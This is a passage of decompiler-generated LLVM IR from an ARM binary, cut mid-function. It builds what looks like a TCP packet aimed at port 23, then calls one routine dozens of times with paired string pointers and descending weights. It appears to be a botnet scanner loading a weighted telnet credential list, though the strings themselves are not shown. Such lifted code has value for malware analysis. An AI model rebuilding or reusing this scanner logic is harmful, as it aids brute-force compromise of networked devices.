  %v3_10aa8 = load i8, i8* @global_var_1ec24.206, align 1
  store i32 ptrtoint (i8** @global_var_1ec04.201 to i32), i32* %lr.global-to-local, align 4
  %v3_10ab0228 = udiv i32 %v4_10aa4, 256
  store i8 64, i8* bitcast (i32* @global_var_1ec0c.207 to i8*), align 4
  %v2_10abc = and i32 %v0_10a9c, 128
  %v3_10abc = icmp ne i32 %v2_10abc, 0
  store i1 %v3_10abc, i1* %cpsr_c.global-to-local, align 1
  %v4_10abc227 = udiv i32 %v0_10a9c, 256
  store i32 ptrtoint (i32* @global_var_1ec18.205 to i32), i32* %r3.global-to-local, align 4
  %tmp = urem i8 %v3_10aa8, 16
  %v1_10ac4 = zext i8 %tmp to i32
  %v1_10ac8 = trunc i32 %v4_10abc227 to i8
  store i8 %v1_10ac8, i8* bitcast (i32* @global_var_1ec09.208 to i8*), align 4
  %v1_10acc = or i32 %v1_10ac4, 80
  store i32 %v1_10acc, i32* %r1.global-to-local, align 4
  store i32 23, i32* %r2.global-to-local, align 4
  store i32 6, i32* @r6, align 4
  %v1_10ad8 = trunc i32 %v1_10acc to i8
  store i8 %v1_10ad8, i8* @global_var_1ec24.206, align 1
  %v1_10adc = trunc i32 %v3_10ab0228 to i8
  store i8 %v1_10adc, i8* bitcast (i32* @global_var_1ec19.209 to i8*), align 4
  store i8 23, i8* bitcast (i32* @global_var_1ec1b.210 to i8*), align 4
  store i8 6, i8* bitcast (i32* @global_var_1ec0d.211 to i8*), align 4
  store i32 %v4_10aa4, i32* %ip.global-to-local, align 4
  store i8 %v1_10a9c, i8* bitcast (i32* @global_var_1ec08.212 to i8*), align 4
  store i8 %v5_10a50.le, i8* bitcast (i32* @global_var_1ec18.205 to i8*), align 4
  %v0_10af4 = load i32, i32* @r5, align 4
  %v1_10af4 = trunc i32 %v0_10af4 to i8
  store i8 %v1_10af4, i8* bitcast (i32* @global_var_1ec1a.213 to i8*), align 4
  %v0_10af8 = call i32 @function_fe60()
  %v1_10af8 = trunc i32 %v0_10af8 to i8
  store i32 ptrtoint (i32* @global_var_1ec18.205 to i32), i32* @lr, align 4
  %v3_10b00 = load i8, i8* @global_var_1ec25.214, align 1
  %v4_10b00 = zext i8 %v3_10b00 to i32
  %v2_10b04 = and i32 %v0_10af8, 128
  %v3_10b04 = icmp ne i32 %v2_10b04, 0
  store i1 %v3_10b04, i1* %cpsr_c.global-to-local, align 1
  %v4_10b04 = sdiv i32 %v0_10af8, 256
  store i32 %v4_10b04, i32* %ip.global-to-local, align 4
  %v1_10b08 = or i32 %v4_10b00, 2
  store i32 %v1_10b08, i32* %r3.global-to-local, align 4
  store i32 %v0_10af8, i32* @r4, align 4
  %v1_10b10 = trunc i32 %v4_10b04 to i8
  store i8 %v1_10b10, i8* bitcast (i32* @global_var_1ec27.215 to i8*), align 4
  %v1_10b14 = trunc i32 %v1_10b08 to i8
  store i8 %v1_10b14, i8* @global_var_1ec25.214, align 1
  store i8 %v1_10af8, i8* bitcast (i32* @global_var_1ec26.216 to i8*), align 4
  store i32 ptrtoint ([5 x i8]* @global_var_16164.218 to i32), i32* %r0.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_1616c.220 to i32), i32* %r1.global-to-local, align 4
  store i32 10, i32* %r2.global-to-local, align 4
  %v4_10b28 = call i32 @function_10778(i32 ptrtoint ([5 x i8]* @global_var_16164.218 to i32), i32 ptrtoint (i32* @global_var_1616c.220 to i32), i32 10)
  store i32 ptrtoint ([5 x i8]* @global_var_16164.218 to i32), i32* %r0.global-to-local, align 4
  store i32 ptrtoint ([6 x i8]* @global_var_16174.222 to i32), i32* %r1.global-to-local, align 4
  store i32 9, i32* %r2.global-to-local, align 4
  %v5_10b38 = call i32 @function_10778(i32 ptrtoint ([5 x i8]* @global_var_16164.218 to i32), i32 ptrtoint ([6 x i8]* @global_var_16174.222 to i32), i32 9)
  store i32 ptrtoint ([5 x i8]* @global_var_16164.218 to i32), i32* %r0.global-to-local, align 4
  store i32 ptrtoint ([6 x i8]* @global_var_1617c.224 to i32), i32* %r1.global-to-local, align 4
  store i32 8, i32* %r2.global-to-local, align 4
  %v5_10b48 = call i32 @function_10778(i32 ptrtoint ([5 x i8]* @global_var_16164.218 to i32), i32 ptrtoint ([6 x i8]* @global_var_1617c.224 to i32), i32 8)
  store i32 ptrtoint ([6 x i8]* @global_var_1617c.224 to i32), i32* %r0.global-to-local, align 4
  store i32 7, i32* %r2.global-to-local, align 4
  store i32 ptrtoint ([6 x i8]* @global_var_1617c.224 to i32), i32* %r1.global-to-local, align 4
  %v5_10b58 = call i32 @function_10778(i32 ptrtoint ([6 x i8]* @global_var_1617c.224 to i32), i32 ptrtoint ([6 x i8]* @global_var_1617c.224 to i32), i32 7)
  %v0_10b5c = load i32, i32* @r6, align 4
  store i32 %v0_10b5c, i32* %r2.global-to-local, align 4
  store i32 ptrtoint ([5 x i8]* @global_var_16164.218 to i32), i32* %r0.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_16184.226 to i32), i32* %r1.global-to-local, align 4
  %v4_10b68 = call i32 @function_10778(i32 ptrtoint ([5 x i8]* @global_var_16164.218 to i32), i32 ptrtoint (i32* @global_var_16184.226 to i32), i32 %v0_10b5c)
  store i32 ptrtoint ([5 x i8]* @global_var_16164.218 to i32), i32* %r0.global-to-local, align 4
  store i32 ptrtoint ([8 x i8]* @global_var_1618c.228 to i32), i32* %r1.global-to-local, align 4
  store i32 5, i32* %r2.global-to-local, align 4
  %v5_10b78 = call i32 @function_10778(i32 ptrtoint ([5 x i8]* @global_var_16164.218 to i32), i32 ptrtoint ([8 x i8]* @global_var_1618c.228 to i32), i32 5)
  store i32 ptrtoint ([5 x i8]* @global_var_16164.218 to i32), i32* %r0.global-to-local, align 4
  store i32 ptrtoint ([8 x i8]* @global_var_16194.230 to i32), i32* %r1.global-to-local, align 4
  store i32 5, i32* %r2.global-to-local, align 4
  %v5_10b88 = call i32 @function_10778(i32 ptrtoint ([5 x i8]* @global_var_16164.218 to i32), i32 ptrtoint ([8 x i8]* @global_var_16194.230 to i32), i32 5)
  store i32 ptrtoint ([5 x i8]* @global_var_16164.218 to i32), i32* %r0.global-to-local, align 4
  store i32 ptrtoint ([9 x i8]* @global_var_1619c.232 to i32), i32* %r1.global-to-local, align 4
  store i32 5, i32* %r2.global-to-local, align 4
  %v5_10b98 = call i32 @function_10778(i32 ptrtoint ([5 x i8]* @global_var_16164.218 to i32), i32 ptrtoint ([9 x i8]* @global_var_1619c.232 to i32), i32 5)
  store i32 ptrtoint ([5 x i8]* @global_var_16164.218 to i32), i32* %r0.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_161a8.234 to i32), i32* %r1.global-to-local, align 4
  store i32 5, i32* %r2.global-to-local, align 4
  %v4_10ba8 = call i32 @function_10778(i32 ptrtoint ([5 x i8]* @global_var_16164.218 to i32), i32 ptrtoint (i32* @global_var_161a8.234 to i32), i32 5)
  store i32 ptrtoint ([5 x i8]* @global_var_16164.218 to i32), i32* %r0.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_161b0.236 to i32), i32* %r1.global-to-local, align 4
  store i32 5, i32* %r2.global-to-local, align 4
  %v4_10bb8 = call i32 @function_10778(i32 ptrtoint ([5 x i8]* @global_var_16164.218 to i32), i32 ptrtoint (i32* @global_var_161b0.236 to i32), i32 5)
  store i32 ptrtoint ([8 x i8]* @global_var_161b8.238 to i32), i32* %r0.global-to-local, align 4
  store i32 5, i32* %r2.global-to-local, align 4
  store i32 ptrtoint ([8 x i8]* @global_var_161b8.238 to i32), i32* %r1.global-to-local, align 4
  %v5_10bc8 = call i32 @function_10778(i32 ptrtoint ([8 x i8]* @global_var_161b8.238 to i32), i32 ptrtoint ([8 x i8]* @global_var_161b8.238 to i32), i32 5)
  store i32 ptrtoint ([5 x i8]* @global_var_16164.218 to i32), i32* %r0.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_15f38.240 to i32), i32* %r1.global-to-local, align 4
  store i32 4, i32* %r2.global-to-local, align 4
  %v4_10bd8 = call i32 @function_10778(i32 ptrtoint ([5 x i8]* @global_var_16164.218 to i32), i32 ptrtoint (i32* @global_var_15f38.240 to i32), i32 4)
  store i32 ptrtoint ([6 x i8]* @global_var_1617c.224 to i32), i32* %r0.global-to-local, align 4
  store i32 ptrtoint ([9 x i8]* @global_var_15ffc.242 to i32), i32* %r1.global-to-local, align 4
  store i32 4, i32* %r2.global-to-local, align 4
  %v5_10be8 = call i32 @function_10778(i32 ptrtoint ([6 x i8]* @global_var_1617c.224 to i32), i32 ptrtoint ([9 x i8]* @global_var_15ffc.242 to i32), i32 4)
  store i32 ptrtoint ([5 x i8]* @global_var_16164.218 to i32), i32* %r0.global-to-local, align 4
  store i32 4, i32* %r2.global-to-local, align 4
  store i32 ptrtoint ([5 x i8]* @global_var_16164.218 to i32), i32* %r1.global-to-local, align 4
  %v5_10bf8 = call i32 @function_10778(i32 ptrtoint ([5 x i8]* @global_var_16164.218 to i32), i32 ptrtoint ([5 x i8]* @global_var_16164.218 to i32), i32 4)
  store i32 ptrtoint ([5 x i8]* @global_var_16164.218 to i32), i32* %r0.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_16008.244 to i32), i32* %r1.global-to-local, align 4
  store i32 4, i32* %r2.global-to-local, align 4
  %v4_10c08 = call i32 @function_10778(i32 ptrtoint ([5 x i8]* @global_var_16164.218 to i32), i32 ptrtoint (i32* @global_var_16008.244 to i32), i32 4)
  store i32 ptrtoint ([5 x i8]* @global_var_16010.246 to i32), i32* %r0.global-to-local, align 4
  store i32 3, i32* %r2.global-to-local, align 4
  store i32 ptrtoint ([5 x i8]* @global_var_16010.246 to i32), i32* %r1.global-to-local, align 4
  %v5_10c18 = call i32 @function_10778(i32 ptrtoint ([5 x i8]* @global_var_16010.246 to i32), i32 ptrtoint ([5 x i8]* @global_var_16010.246 to i32), i32 3)
  store i32 ptrtoint ([6 x i8]* @global_var_1617c.224 to i32), i32* %r0.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_15f38.240 to i32), i32* %r1.global-to-local, align 4
  store i32 3, i32* %r2.global-to-local, align 4
  %v4_10c28 = call i32 @function_10778(i32 ptrtoint ([6 x i8]* @global_var_1617c.224 to i32), i32 ptrtoint (i32* @global_var_15f38.240 to i32), i32 3)
  store i32 ptrtoint ([5 x i8]* @global_var_16164.218 to i32), i32* %r0.global-to-local, align 4
  store i32 ptrtoint ([5 x i8]* @global_var_16018.248 to i32), i32* %r1.global-to-local, align 4
  store i32 3, i32* %r2.global-to-local, align 4
  %v5_10c38 = call i32 @function_10778(i32 ptrtoint ([5 x i8]* @global_var_16164.218 to i32), i32 ptrtoint ([5 x i8]* @global_var_16018.248 to i32), i32 3)
  store i32 ptrtoint ([6 x i8]* @global_var_1617c.224 to i32), i32* %r0.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_16020.250 to i32), i32* %r1.global-to-local, align 4
  store i32 3, i32* %r2.global-to-local, align 4
  %v4_10c48 = call i32 @function_10778(i32 ptrtoint ([6 x i8]* @global_var_1617c.224 to i32), i32 ptrtoint (i32* @global_var_16020.250 to i32), i32 3)
  store i32 ptrtoint ([5 x i8]* @global_var_16164.218 to i32), i32* %r0.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_1602c.252 to i32), i32* %r1.global-to-local, align 4
  store i32 3, i32* %r2.global-to-local, align 4
  %v4_10c58 = call i32 @function_10778(i32 ptrtoint ([5 x i8]* @global_var_16164.218 to i32), i32 ptrtoint (i32* @global_var_1602c.252 to i32), i32 3)
  store i32 ptrtoint ([6 x i8]* @global_var_1617c.224 to i32), i32* %r0.global-to-local, align 4
  store i32 ptrtoint ([9 x i8]* @global_var_16034.254 to i32), i32* %r1.global-to-local, align 4
  store i32 3, i32* %r2.global-to-local, align 4
  %v5_10c68 = call i32 @function_10778(i32 ptrtoint ([6 x i8]* @global_var_1617c.224 to i32), i32 ptrtoint ([9 x i8]* @global_var_16034.254 to i32), i32 3)
  store i32 ptrtoint ([6 x i8]* @global_var_1617c.224 to i32), i32* %r0.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_1602c.252 to i32), i32* %r1.global-to-local, align 4
  store i32 2, i32* %r2.global-to-local, align 4
  %v4_10c78 = call i32 @function_10778(i32 ptrtoint ([6 x i8]* @global_var_1617c.224 to i32), i32 ptrtoint (i32* @global_var_1602c.252 to i32), i32 2)
  store i32 ptrtoint ([5 x i8]* @global_var_16164.218 to i32), i32* %r0.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_16040.256 to i32), i32* %r1.global-to-local, align 4
  store i32 2, i32* %r2.global-to-local, align 4
  %v4_10c88 = call i32 @function_10778(i32 ptrtoint ([5 x i8]* @global_var_16164.218 to i32), i32 ptrtoint (i32* @global_var_16040.256 to i32), i32 2)
  store i32 ptrtoint ([5 x i8]* @global_var_16164.218 to i32), i32* %r0.global-to-local, align 4
  store i32 ptrtoint ([9 x i8]* @global_var_15ffc.242 to i32), i32* %r1.global-to-local, align 4
  store i32 2, i32* %r2.global-to-local, align 4
  %v5_10c98 = call i32 @function_10778(i32 ptrtoint ([5 x i8]* @global_var_16164.218 to i32), i32 ptrtoint ([9 x i8]* @global_var_15ffc.242 to i32), i32 2)
  store i32 ptrtoint ([5 x i8]* @global_var_16164.218 to i32), i32* %r0.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_16048.258 to i32), i32* %r1.global-to-local, align 4
  store i32 2, i32* %r2.global-to-local, align 4
  %v4_10ca8 = call i32 @function_10778(i32 ptrtoint ([5 x i8]* @global_var_16164.218 to i32), i32 ptrtoint (i32* @global_var_16048.258 to i32), i32 2)
  store i32 ptrtoint ([5 x i8]* @global_var_16164.218 to i32), i32* %r0.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_16050.260 to i32), i32* %r1.global-to-local, align 4
  store i32 1, i32* %r2.global-to-local, align 4
  %v4_10cb8 = call i32 @function_10778(i32 ptrtoint ([5 x i8]* @global_var_16164.218 to i32), i32 ptrtoint (i32* @global_var_16050.260 to i32), i32 1)
  store i32 ptrtoint ([14 x i8]* @global_var_16058.262 to i32), i32* %r0.global-to-local, align 4
  store i32 ptrtoint ([7 x i8]* @global_var_16068.264 to i32), i32* %r1.global-to-local, align 4
  store i32 1, i32* %r2.global-to-local, align 4
  %v5_10cc8 = call i32 @function_10778(i32 ptrtoint ([14 x i8]* @global_var_16058.262 to i32), i32 ptrtoint ([7 x i8]* @global_var_16068.264 to i32), i32 1)
  store i32 ptrtoint ([8 x i8]* @global_var_16070.266 to i32), i32* %r0.global-to-local, align 4
  store i32 1, i32* %r2.global-to-local, align 4
  store i32 ptrtoint ([8 x i8]* @global_var_16070.266 to i32), i32* %r1.global-to-local, align 4
  %v5_10cd8 = call i32 @function_10778(i32 ptrtoint ([8 x i8]* @global_var_16070.266 to i32), i32 ptrtoint ([8 x i8]* @global_var_16070.266 to i32), i32 1)
  store i32 ptrtoint ([11 x i8]* @global_var_16078.268 to i32), i32* %r0.global-to-local, align 4
  store i32 1, i32* %r2.global-to-local, align 4
  store i32 ptrtoint ([11 x i8]* @global_var_16078.268 to i32), i32* %r1.global-to-local, align 4
  %v5_10ce8 = call i32 @function_10778(i32 ptrtoint ([11 x i8]* @global_var_16078.268 to i32), i32 ptrtoint ([11 x i8]* @global_var_16078.268 to i32), i32 1)
  store i32 ptrtoint ([6 x i8]* @global_var_16084.270 to i32), i32* %r0.global-to-local, align 4
  store i32 1, i32* %r2.global-to-local, align 4
  store i32 ptrtoint ([6 x i8]* @global_var_16084.270 to i32), i32* %r1.global-to-local, align 4
  %v5_10cf8 = call i32 @function_10778(i32 ptrtoint ([6 x i8]* @global_var_16084.270 to i32), i32 ptrtoint ([6 x i8]* @global_var_16084.270 to i32), i32 1)
  store i32 ptrtoint ([6 x i8]* @global_var_16084.270 to i32), i32* %r0.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_16008.244 to i32), i32* %r1.global-to-local, align 4
  store i32 1, i32* %r2.global-to-local, align 4
  %v4_10d08 = call i32 @function_10778(i32 ptrtoint ([6 x i8]* @global_var_16084.270 to i32), i32 ptrtoint (i32* @global_var_16008.244 to i32), i32 1)
  store i32 ptrtoint ([6 x i8]* @global_var_16084.270 to i32), i32* %r0.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_16008.244 to i32), i32* %r1.global-to-local, align 4
  store i32 1, i32* %r2.global-to-local, align 4
  %v4_10d18 = call i32 @function_10778(i32 ptrtoint ([6 x i8]* @global_var_16084.270 to i32), i32 ptrtoint (i32* @global_var_16008.244 to i32), i32 1)
  store i32 ptrtoint (i32* @global_var_1608c.272 to i32), i32* %r0.global-to-local, align 4
  store i32 ptrtoint ([9 x i8]* @global_var_15ffc.242 to i32), i32* %r1.global-to-local, align 4
  store i32 1, i32* %r2.global-to-local, align 4
  %v4_10d28 = call i32 @function_10778(i32 ptrtoint (i32* @global_var_1608c.272 to i32), i32 ptrtoint ([9 x i8]* @global_var_15ffc.242 to i32), i32 1)
  store i32 ptrtoint ([14 x i8]* @global_var_16094.274 to i32), i32* %r0.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_16048.258 to i32), i32* %r1.global-to-local, align 4
  store i32 1, i32* %r2.global-to-local, align 4
  %v4_10d38 = call i32 @function_10778(i32 ptrtoint ([14 x i8]* @global_var_16094.274 to i32), i32 ptrtoint (i32* @global_var_16048.258 to i32), i32 1)
  store i32 ptrtoint (i32* @global_var_16040.256 to i32), i32* %r0.global-to-local, align 4
  store i32 1, i32* %r2.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_16040.256 to i32), i32* %r1.global-to-local, align 4
  %v3_10d48 = call i32 @function_10778(i32 ptrtoint (i32* @global_var_16040.256 to i32), i32 ptrtoint (i32* @global_var_16040.256 to i32), i32 1)
  store i32 ptrtoint (i32* @global_var_16184.226 to i32), i32* %r0.global-to-local, align 4
  store i32 1, i32* %r2.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_16184.226 to i32), i32* %r1.global-to-local, align 4
  %v3_10d58 = call i32 @function_10778(i32 ptrtoint (i32* @global_var_16184.226 to i32), i32 ptrtoint (i32* @global_var_16184.226 to i32), i32 1)
  store i32 ptrtoint ([5 x i8]* @global_var_160a4.276 to i32), i32* %r0.global-to-local, align 4
  store i32 1, i32* %r2.global-to-local, align 4
  store i32 ptrtoint ([5 x i8]* @global_var_160a4.276 to i32), i32* %r1.global-to-local, align 4
  %v5_10d68 = call i32 @function_10778(i32 ptrtoint ([5 x i8]* @global_var_160a4.276 to i32), i32 ptrtoint ([5 x i8]* @global_var_160a4.276 to i32), i32 1)
  store i32 ptrtoint ([5 x i8]* @global_var_16164.218 to i32), i32* %r0.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_160ac.278 to i32), i32* %r1.global-to-local, align 4
  store i32 1, i32* %r2.global-to-local, align 4
  %v4_10d78 = call i32 @function_10778(i32 ptrtoint ([5 x i8]* @global_var_16164.218 to i32), i32 ptrtoint (i32* @global_var_160ac.278 to i32), i32 1)
  store i32 ptrtoint ([5 x i8]* @global_var_16164.218 to i32), i32* %r0.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_160b4.280 to i32), i32* %r1.global-to-local, align 4
  store i32 1, i32* %r2.global-to-local, align 4
  %v4_10d88 = call i32 @function_10778(i32 ptrtoint ([5 x i8]* @global_var_16164.218 to i32), i32 ptrtoint (i32* @global_var_160b4.280 to i32), i32 1)
  store i32 ptrtoint ([5 x i8]* @global_var_16164.218 to i32), i32* %r0.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_160bc.282 to i32), i32* %r1.global-to-local, align 4
  store i32 1, i32* %r2.global-to-local, align 4
  %v4_10d98 = call i32 @function_10778(i32 ptrtoint ([5 x i8]* @global_var_16164.218 to i32), i32 ptrtoint (i32* @global_var_160bc.282 to i32), i32 1)
  store i32 ptrtoint ([5 x i8]* @global_var_16164.218 to i32), i32* %r0.global-to-local, align 4
  store i32 ptrtoint ([6 x i8]* @global_var_160c4.284 to i32), i32* %r1.global-to-local, align 4
  store i32 1, i32* %r2.global-to-local, align 4
  %v5_10da8 = call i32 @function_10778(i32 ptrtoint ([5 x i8]* @global_var_16164.218 to i32), i32 ptrtoint ([6 x i8]* @global_var_160c4.284 to i32), i32 1)
  store i32 ptrtoint ([5 x i8]* @global_var_16164.218 to i32), i32* %r0.global-to-local, align 4
  store i32 ptrtoint ([5 x i8]* @global_var_160cc.286 to i32), i32* %r1.global-to-local, align 4
  store i32 4, i32* %r2.global-to-local, align 4
  %v5_10db8 = call i32 @function_10778(i32 ptrtoint ([5 x i8]* @global_var_16164.218 to i32), i32 ptrtoint ([5 x i8]* @global_var_160cc.286 to i32), i32 4)
  store i32 ptrtoint ([5 x i8]* @global_var_16164.218 to i32), i32* %r0.global-to-local, align 4
  store i32 ptrtoint ([6 x i8]* @global_var_160d4.288 to i32), i32* %r1.global-to-local, align 4
  store i32 1, i32* %r2.global-to-local, align 4
  %v5_10dc8 = call i32 @function_10778(i32 ptrtoint ([5 x i8]* @global_var_16164.218 to i32), i32 ptrtoint ([6 x i8]* @global_var_160d4.288 to i32), i32 1)
  store i32 ptrtoint ([5 x i8]* @global_var_16164.218 to i32), i32* %r0.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_160dc.290 to i32), i32* %r1.global-to-local, align 4
  store i32 1, i32* %r2.global-to-local, align 4
  %v4_10dd8 = call i32 @function_10778(i32 ptrtoint ([5 x i8]* @global_var_16164.218 to i32), i32 ptrtoint (i32* @global_var_160dc.290 to i32), i32 1)
  store i32 ptrtoint ([5 x i8]* @global_var_16164.218 to i32), i32* %r0.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_160ec.292 to i32), i32* %r1.global-to-local, align 4
  store i32 1, i32* %r2.global-to-local, align 4
  %v4_10de8 = call i32 @function_10778(i32 ptrtoint ([5 x i8]* @global_var_16164.218 to i32), i32 ptrtoint (i32* @global_var_160ec.292 to i32), i32 1)
  store i32 ptrtoint ([5 x i8]* @global_var_16164.218 to i32), i32* %r0.global-to-local, align 4
  store i32 ptrtoint ([7 x i8]* @global_var_160fc.294 to i32), i32* %r1.global-to-local, align 4
  store i32 1, i32* %r2.global-to-local, align 4
  %v5_10df8 = call i32 @function_10778(i32 ptrtoint ([5 x i8]* @global_var_16164.218 to i32), i32 ptrtoint ([7 x i8]* @global_var_160fc.294 to i32), i32 1)
  store i32 ptrtoint ([5 x i8]* @global_var_16164.218 to i32), i32* %r0.global-to-local, align 4
  store i32 ptrtoint ([5 x i8]* @global_var_16104.296 to i32), i32* %r1.global-to-local, align 4
  store i32 1, i32* %r2.global-to-local, align 4
  %v5_10e08 = call i32 @function_10778(i32 ptrtoint ([5 x i8]* @global_var_16164.218 to i32), i32 ptrtoint ([5 x i8]* @global_var_16104.296 to i32), i32 1)
  store i32 ptrtoint ([5 x i8]* @global_var_16164.218 to i32), i32* %r0.global-to-local, align 4
  store i32 ptrtoint ([9 x i8]* @global_var_1610c.298 to i32), i32* %r1.global-to-local, align 4
  store i32 1, i32* %r2.global-to-local, align 4
  %v5_10e18 = call i32 @function_10778(i32 ptrtoint ([5 x i8]* @global_var_16164.218 to i32), i32 ptrtoint ([9 x i8]* @global_var_1610c.298 to i32), i32 1)
  store i32 ptrtoint ([5 x i8]* @global_var_16164.218 to i32), i32* %r0.global-to-local, align 4
  store i32 ptrtoint ([5 x i8]* @global_var_16010.246 to i32), i32* %r1.global-to-local, align 4
  store i32 1, i32* %r2.global-to-local, align 4
  %v5_10e28 = call i32 @function_10778(i32 ptrtoint ([5 x i8]* @global_var_16164.218 to i32), i32 ptrtoint ([5 x i8]* @global_var_16010.246 to i32), i32 1)
  store i32 ptrtoint ([5 x i8]* @global_var_16164.218 to i32), i32* %r0.global-to-local, align 4
  store i32 ptrtoint ([8 x i8]* @global_var_16118.300 to i32), i32* %r1.global-to-local, align 4
  store i32 1, i32* %r2.global-to-local, align 4
  %v5_10e38 = call i32 @function_10778(i32 ptrtoint ([5 x i8]* @global_var_16164.218 to i32), i32 ptrtoint ([8 x i8]* @global_var_16118.300 to i32), i32 1)
  store i32 ptrtoint ([5 x i8]* @global_var_16164.218 to i32), i32* %r0.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_16120.302 to i32), i32* %r1.global-to-local, align 4
  store i32 1, i32* %r2.global-to-local, align 4
  %v4_10e48 = call i32 @function_10778(i32 ptrtoint ([5 x i8]* @global_var_16164.218 to i32), i32 ptrtoint (i32* @global_var_16120.302 to i32), i32 1)
  store i32 ptrtoint ([6 x i8]* @global_var_1617c.224 to i32), i32* %r0.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_1612c.304 to i32), i32* %r1.global-to-local, align 4
  store i32 1, i32* %r2.global-to-local, align 4
  %v4_10e58 = call i32 @function_10778(i32 ptrtoint ([6 x i8]* @global_var_1617c.224 to i32), i32 ptrtoint (i32* @global_var_1612c.304 to i32), i32 1)
  store i32 ptrtoint ([6 x i8]* @global_var_1617c.224 to i32), i32* %r0.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_16048.258 to i32), i32* %r1.global-to-local, align 4
  store i32 1, i32* %r2.global-to-local, align 4
  %v4_10e68 = call i32 @function_10778(i32 ptrtoint ([6 x i8]* @global_var_1617c.224 to i32), i32 ptrtoint (i32* @global_var_16048.258 to i32), i32 1)
  store i32 ptrtoint ([6 x i8]* @global_var_1617c.224 to i32), i32* %r0.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_16008.244 to i32), i32* %r1.global-to-local, align 4
  store i32 1, i32* %r2.global-to-local, align 4
  %v4_10e78 = call i32 @function_10778(i32 ptrtoint ([6 x i8]* @global_var_1617c.224 to i32), i32 ptrtoint (i32* @global_var_16008.244 to i32), i32 1)
  store i32 ptrtoint ([6 x i8]* @global_var_1617c.224 to i32), i32* %r0.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_161b0.236 to i32), i32* %r1.global-to-local, align 4
  store i32 1, i32* %r2.global-to-local, align 4
  %v4_10e88 = call i32 @function_10778(i32 ptrtoint ([6 x i8]* @global_var_1617c.224 to i32), i32 ptrtoint (i32* @global_var_161b0.236 to i32), i32 1)
  store i32 ptrtoint ([6 x i8]* @global_var_1617c.224 to i32), i32* %r0.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_161a8.234 to i32), i32* %r1.global-to-local, align 4
  store i32 1, i32* %r2.global-to-local, align 4
  %v4_10e98 = call i32 @function_10778(i32 ptrtoint ([6 x i8]* @global_var_1617c.224 to i32), i32 ptrtoint (i32* @global_var_161a8.234 to i32), i32 1)
  store i32 ptrtoint ([6 x i8]* @global_var_1617c.224 to i32), i32* %r0.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_160ec.292 to i32), i32* %r1.global-to-local, align 4
  store i32 1, i32* %r2.global-to-local, align 4
  %v4_10ea8 = call i32 @function_10778(i32 ptrtoint ([6 x i8]* @global_var_1617c.224 to i32), i32 ptrtoint (i32* @global_var_160ec.292 to i32), i32 1)
  store i32 ptrtoint ([6 x i8]* @global_var_1617c.224 to i32), i32* %r0.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_16134.306 to i32), i32* %r1.global-to-local, align 4
  store i32 1, i32* %r2.global-to-local, align 4
  %v4_10eb8 = call i32 @function_10778(i32 ptrtoint ([6 x i8]* @global_var_1617c.224 to i32), i32 ptrtoint (i32* @global_var_16134.306 to i32), i32 1)
  store i32 ptrtoint ([6 x i8]* @global_var_1617c.224 to i32), i32* %r0.global-to-local, align 4
  store i32 ptrtoint ([5 x i8]* @global_var_16018.248 to i32), i32* %r1.global-to-local, align 4
  store i32 1, i32* %r2.global-to-local, align 4
  %v5_10ec8 = call i32 @function_10778(i32 ptrtoint ([6 x i8]* @global_var_1617c.224 to i32), i32 ptrtoint ([5 x i8]* @global_var_16018.248 to i32), i32 1)
  store i32 ptrtoint ([6 x i8]* @global_var_1617c.224 to i32), i32* %r0.global-to-local, align 4
  store i32 ptrtoint ([7 x i8]* @global_var_16068.264 to i32), i32* %r1.global-to-local, align 4
  store i32 1, i32* %r2.global-to-local, align 4
  %v5_10ed8 = call i32 @function_10778(i32 ptrtoint ([6 x i8]* @global_var_1617c.224 to i32), i32 ptrtoint ([7 x i8]* @global_var_16068.264 to i32), i32 1)
  store i32 ptrtoint ([5 x i8]* @global_var_161a0.308 to i32), i32* %r0.global-to-local, align 4
  store i32 1, i32* %r2.global-to-local, align 4
  store i32 ptrtoint ([5 x i8]* @global_var_161a0.308 to i32), i32* %r1.global-to-local, align 4
  %v5_10ee8 = call i32 @function_10778(i32 ptrtoint ([5 x i8]* @global_var_161a0.308 to i32), i32 ptrtoint ([5 x i8]* @global_var_161a0.308 to i32), i32 1)
  store i32 ptrtoint ([7 x i8]* @global_var_1613c.310 to i32), i32* %r0.global-to-local, align 4
  store i32 ptrtoint ([7 x i8]* @global_var_16144.312 to i32), i32* %r1.global-to-local, align 4
  store i32 1, i32* %r2.global-to-local, align 4
  %v5_10ef8 = call i32 @function_10778(i32 ptrtoint ([7 x i8]* @global_var_1613c.310 to i32), i32 ptrtoint ([7 x i8]* @global_var_16144.312 to i32), i32 1)
  %v2_10f00 = ptrtoint i32* %stack_var_-1862 to i32
  store i32 %v2_10f00, i32* %r0.global-to-local, align 4
  %v2_10f04 = ptrtoint i32* %stack_var_-1842 to i32
  store i32 %v2_10f04, i32* %r1.global-to-local, align 4
  %tmp277 = bitcast i32* %stack_var_-1842 to i8*
  br label %dec_label_pc_10f10

dec_label_pc_10f10:                               ; preds = %dec_label_pc_11568, %dec_label_pc_10a68
